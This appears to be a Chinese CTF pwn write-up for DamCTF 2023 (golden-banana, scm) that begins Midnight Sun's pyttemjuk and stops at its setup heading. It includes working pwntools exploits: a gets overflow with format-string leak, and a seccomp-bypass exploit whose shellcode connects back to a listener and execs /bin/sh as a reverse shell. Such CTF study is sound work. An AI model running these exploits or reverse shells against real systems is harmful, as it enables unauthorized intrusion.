
# [原创]DamCTF and Midnight Sun CTF Qualifiers pwn部分wp

就看了几道pwn题，但佬们速度太快全秒了，赛后复现一波

## DamCTF 2023 Quals

### golden-banana

> By BobbySinclusto
>
> The Quest for the Golden Banana is a text-based adventure game that combines humor, action, and mystery in an epic story that will keep you hooked until the end. Explore exotic locations, interact with colorful characters, and make choices that will shape your destiny. Do you have what it takes to complete The Quest for the Golden Banana?
>
> The story for this challenge was entirely written by the Bing AI chatbot :-)

是一个小游戏程序，开始时会读取房间信息，所有的信息保存在`main`函数中的`game`结构体局部变量里，每个房间的选项结构体中保存选择该选项后要到达的房间的地址。

房间信息文件里有一个`SECRET ROOM`，会直接输出flag。

在输入选项的地方用`gets`，存在溢出漏洞。

```c++
// Get choice from user
gets(g.input_buf);
// Allow either specifying the number or typing the description
choice = atoi(g.input_buf) - 1;
```

输出描述信息时用`printf`直接打印每个房间的描述信息。

```c++
void print_location(location *l) {
    printf(l->description);
    if (l->end_location) {
        exit(0);
    }
    for (int i = 0; i < l->num_choices; ++i) {
        printf("%d: %s", i + 1, l->choices[i].description);
    }
}
```

思路是利用`gets`溢出覆盖到某一个房间的描述信息，通过格式化字符串泄漏出栈地址，再通过`gets`溢出覆盖选项结构体中目标房间的指针，跳转到`SECRET ROOM`。

很久没有打CTF了以至于已经忘了`gets`是`\x0a`截断而不是`\x00`截断，卡了好久。

```python
#!/usr/bin/python
from pwn import *
import sys
import time
context.log_level = 'debug'
context.arch='amd64'

def exp(ip, port):
    local=1
    binary_name='golden_banana'
    libc_name='libc.so.6'
    libc=ELF("./"+libc_name)
    e=ELF("./"+binary_name)
    if local:
        p=process("./"+binary_name)
    else:
        p=remote(ip,port)
    def z(a=''):
        if local:
            gdb.attach(p,a)
        if a=='':
            raw_input
        else:
            pass
    ru=lambda x:p.recvuntil(x)
    sl=lambda x:p.sendline(x)
    sd=lambda x:p.send(x)
    sa=lambda a,b:p.sendafter(a,b)
    sla=lambda a,b:p.sendlineafter(a,b)
    ia=lambda :p.interactive()
    def cat():
        ru('> ')
        sl('cat')
    def echo(x):
        ru('> ')
        sl(b'echo '+x)
    def exit():
        ru('> ')
        sl('exit')
    z('b*$rebase(0x17fa)')
    time.sleep(1)
    ru('2: Go south')
    sl('1\x00')
    ru('2: No, go back')
    sl('2\x00'+'1'*(0x1828-2)+'%3$lx')
    ru('2: Go south')
    sl('1\x00')
    stack = int(ru(':')[:-2],16)
    ru('2: No, go back')
    sl(b'1\x00'+b'1'*(0x2028-2)+p64(stack+0x1428*11))
    p.interactive()
    return ''

if __name__ == "__main__":
    flag = exp(0, 0)
```

### scm

> By captainGeech
>
> Keeping track of your different shellcode payloads is annoying, but the SCM is here to help! Safety first, though!

题目文件是一个shellcode管理器，3种不同的shellcode，分别用`seccomp-tools`查沙箱。

```text
'''
type1
Running shellcode... line CODE JT JF K
=================================
0000: 0x20 0x00 0x00 0x00000004 A = arch
0001: 0x15 0x00 0x06 0xc000003e if (A != ARCH_X86_64) goto 0008
0002: 0x20 0x00 0x00 0x00000000 A = sys_number
0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005
0004: 0x15 0x00 0x03 0xffffffff if (A != 0xffffffff) goto 0008
0005: 0x15 0x01 0x00 0x000000e7 if (A == exit_group) goto 0007
0006: 0x06 0x00 0x00 0x80000000 return KILL_PROCESS
0007: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0008: 0x06 0x00 0x00 0x00000000 return KILL
type2
Running shellcode... line CODE JT JF K
=================================
0000: 0x20 0x00 0x00 0x00000004 A = arch
0001: 0x15 0x00 0x07 0xc000003e if (A != ARCH_X86_64) goto 0009
0002: 0x20 0x00 0x00 0x00000000 A = sys_number
0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005
0004: 0x15 0x00 0x04 0xffffffff if (A != 0xffffffff) goto 0009
0005: 0x15 0x02 0x00 0x00000000 if (A == read) goto 0008
0006: 0x15 0x01 0x00 0x000000e7 if (A == exit_group) goto 0008
0007: 0x06 0x00 0x00 0x80000000 return KILL_PROCESS
0008: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0009: 0x06 0x00 0x00 0x00000000 return KILL
type3
Running shellcode... line CODE JT JF K
=================================
0000: 0x20 0x00 0x00 0x00000004 A = arch
0001: 0x15 0x00 0x07 0xc000003e if (A != ARCH_X86_64) goto 0009
0002: 0x20 0x00 0x00 0x00000000 A = sys_number
0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005
0004: 0x15 0x00 0x04 0xffffffff if (A != 0xffffffff) goto 0009
0005: 0x15 0x02 0x00 0x00000001 if (A == write) goto 0008
0006: 0x15 0x01 0x00 0x000000e7 if (A == exit_group) goto 0008
0007: 0x06 0x00 0x00 0x80000000 return KILL_PROCESS
0008: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0009: 0x06 0x00 0x00 0x00000000 return KILL
'''
```

在执行shellcode的时候会`fork`开启另一个进程来执行，由于进程是资源分配的基本单位，所以`fork`出的子进程的内存页面与父进程一致，可以用`type3`的shellcode进行`write`系统调用泄露地址，但是由于内存页不同，`type2`的shellcode往子进程的内存中写数据就没什么用。

`edit` shellcode的函数中，用`(unsigned __int8)`类型来判断`type`是否在1～3之间，在写入时又用`*(_DWORD *)(a1 + 4) = v2;`写入4字节，可以输入`0x101~0x103`绕过检查并使得`type`不合法。

```c++
unsigned int v2;
... ...
fgets((char *)&v6, 49, stdin);
v2 = strtol((const char *)&v6, 0LL, 10);
if ( (unsigned __int8)(v2 - 1) > 2u ) //bug
{
    puts("Bad type!");
    return 0;
}
printf("Changing type to %d\n", v2);
*(_DWORD *)(a1 + 4) = v2;
... ...
```

在执行shellcode的函数中，会根据`type`类型为进程加沙箱规则，禁用系统调用，但是检查时若`type`大于3，则会直接跳过添加沙箱规则的函数`sub_1279`直接执行。

```c++
if ( !fork() )
{
    close(2); //stderr
    if ( *((_DWORD *)a1 + 1) == 3 || (close(1), *((_DWORD *)a1 + 1) != 2) ) //stdout
    {
        close(0); //stdin
        v2 = *((_DWORD *)a1 + 1);
        if ( v2 == 3 )
        {
            if ( !(unsigned __int8)sub_1279(0LL, 1LL) )
                goto LABEL_13;
            goto LABEL_12;
        }
        if ( v2 > 3 ) //bug
            goto LABEL_12;
        if ( v2 == 1 )
        {
            if ( !(unsigned __int8)sub_1279(0LL, 0LL) )
                goto LABEL_13;
            goto LABEL_12;
        }
        if ( v2 != 2 )
            goto LABEL_12;
    }
    if ( !(unsigned __int8)sub_1279(1LL, 0LL) )
LABEL_13:
        exit(0);
LABEL_12:
    ((void (*)(void))v1)();
    goto LABEL_13;
}
wait((__WAIT_STATUS)stat_loc);
```

所以思路就是`edit`时破坏`type`，执行时绕过添加沙箱规则的函数直接执行shellcode，但是程序在`fork`出的子进程中关闭了三个基本的文件描述符，在执行的shellcode中直接调用`execve("/bin/sh",0,0)`是不行的，需要反弹shell，并且shellcode的长度需要小于`0x64`。

过程就是先在本地监听端口，再用shellcode完成`socket`、`connect`操作。

```c
code = asm(pwnlib.shellcraft.amd64.linux.connect(ip,port))
```

由于此时文件描述符`0`、`1`、`2`都被关闭了，此时的`socket`返回的`fd`是0，所以再完成一次`dup2`操作，复制一个socket的`fd`为1。

```python
code += asm(pwnlib.shellcraft.amd64.linux.dup2(0,1))
```

之后再执行`/bin/sh`时会按照正常情况将`0`作为标准输入，`1`作为标准输出来执行命令，但是此时的文件描述符`0`和`1`其实都已经是socket的`fd`，就在监听端获得了一个shell。

使用多线程编程来在一个窗口get shell，启一个线程与题目交互，主线程监听端口等待反弹shell。由于`pwntools`生成的执行`sh`的shellcode太长，可以自己手写一段。

```python
#!/usr/bin/python
from pwn import *
import sys
import time
import threading
context.log_level = 'debug'
context.arch='amd64'

code = asm(pwnlib.shellcraft.amd64.linux.connect('0.0.0.0',8888))
code += asm(pwnlib.shellcraft.amd64.linux.dup2(0,1))
#code += asm(pwnlib.shellcraft.amd64.linux.sh())
shell='''
xor rsi,rsi;
xor rdx,rdx;
mov rax,0x68732f6e69622f;
push rax;
mov rdi,rsp;
push 59;
pop rax;
syscall
'''
code += asm(shell)

def exp(ip, port):
    local=1
    binary_name='scm'
    libc_name='libc.so.6'
    libc=ELF("./"+libc_name)
    e=ELF("./"+binary_name)
    if local:
        p=process("./"+binary_name)
    else:
        p=remote(ip,port)
    def z(a=''):
        if local:
            gdb.attach(p,a)
        if a=='':
            raw_input
        else:
            pass
    ru=lambda x:p.recvuntil(x)
    sl=lambda x:p.sendline(x)
    sd=lambda x:p.send(x)
    sa=lambda a,b:p.sendafter(a,b)
    sla=lambda a,b:p.sendlineafter(a,b)
    ia=lambda :p.interactive()
    def cho(choice):
        ru('Choice: ')
        sl(str(choice))
    def add(t, s, val):
        cho(1)
        ru('write):')
        sl(str(t))
        ru('shellcode: ')
        sl(str(s))
        ru('Shellcode: ')
        sl(val)
    def delete(idx):
        cho(5)
        ru('index:')
        sl(str(idx))
    def exe(idx):
        cho(3)
        ru('index:')
        sl(str(idx))
    def edit(idx,ty):
        cho(2)
        ru('Shellcode index: ')
        sl(str(idx))
        ru(' (y/n):')
        sl('y')
        ru('3=write): ')
        sl(str(ty))
        ru(' (y/n): ')
        sl('n')
    add(1, len(code), code)
    edit(0,256+1)
    exe(0)
    return ''

if __name__ == "__main__":
    th = threading.Thread(target=exp, args=(0,0))
    th.start()
    io = listen(8888)
    io.wait_for_connection()
    io.interactive()
```

## Midnight Sun CTF 2023 Quals

### pyttemjuk

> Category: pwn
>
> Author: larsh
>
> Simple buffer overflow, but not your normal Linux system! Flag in `c:\flag.txt`
>
> <a href="elink@ccfK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6j5x3h3&6Y4L8W2)9J5c8X3y4@1k6W2)9J5c8X3u0D9L8$3u0Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6U0K9r3q4D9L8q4)9J5k6h3g2^5k6b7`.`.">附件</a>

Windows 平台的pwn

#### 环境搭建
